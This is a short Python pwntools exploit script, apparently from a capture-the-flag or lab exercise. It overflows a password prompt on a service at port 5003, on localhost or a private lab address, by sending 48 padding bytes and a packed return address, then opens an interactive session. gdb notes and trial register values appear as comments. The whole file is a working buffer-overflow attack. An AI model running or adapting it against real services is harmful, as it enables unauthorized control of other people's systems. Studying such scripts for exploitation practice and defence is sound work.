#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
from pwn import *
from struct import pack, unpack

# ebp
MAGIC_EBP = 0xffffcf88 #works!
#MAGIC_EBP = 0xffffcf0c

# padding
MAGIC_LENGTH = 16*3

# retval
MAGIC_RETVAL = 0x3030383D #works!
MAGIC_RETVAL = 0x30303840

if "remote" in sys.argv[1:]:
    conn = remote("192.168.40.51", 5003) 
else:
    conn = remote("localhost", 5003) 

recieved = conn.recvuntil("Password: ")
log.info("Recieved password prompt")
log.info("Sending payload")

# gdb b * 0x30303869
# patch
# sigpipe
MAGIC_EBX = 0x41 #0x3
MAGIC_ESI = 0x41
MAGIC_EDI = 0x41
#MAGIC_EBP#ebp 0xffffcf88
#gdb-multiarch

payload = "A" * 48 + str(p32(MAGIC_RETVAL))

print(payload)

conn.sendline(payload)
conn.interactive()
